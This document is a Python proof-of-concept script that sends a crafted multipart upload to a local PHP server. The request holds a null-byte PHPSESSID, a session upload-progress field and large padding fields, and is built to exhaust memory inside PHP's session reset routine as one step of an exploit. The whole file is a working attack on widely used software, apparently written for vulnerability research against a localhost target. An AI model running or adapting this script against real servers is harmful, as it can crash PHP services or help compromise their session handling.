#!/usr/bin/env python3
"""A: exhaust memory with registered padding fields BEFORE the file, so the
OOM happens inside php_session_reset_id() after PS(send_cookie)=1.
No display_errors / headers_sent needed.
usage: send_a_oomreset.py N V W
  N fields of V-byte values, then 1 field of W-byte value, then file.
"""
import socket,sys
N=int(sys.argv[1]); V=int(sys.argv[2]); W=int(sys.argv[3]) if len(sys.argv)>3 else 0
BND=b'S'*17
parts=[{'name':'PHPSESSID','data':b'\x00'},{'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'}]
for i in range(N):
    parts.append({'name':'f%04d'%i,'data':b'A'*V})
if W>0:
    parts.append({'name':'fine','data':b'B'*W})
parts.append({'name':'f','filename':'a.txt','data':b'A'*64})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\n'
    if 'filename' in p:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"; filename="'+p['filename'].encode()+b'"\r\nContent-Type: application/octet-stream\r\n\r\n'
    else:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'
    o+=p['data']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=30); s.settimeout(30)
try: s.sendall(h+bytes(o))
except OSError: pass
d=b''
try:
    while True:
        c=s.recv(65536)
        if not c: break
        d+=c
except OSError: pass
s.close()
print(d[:300].decode('latin1','replace'))
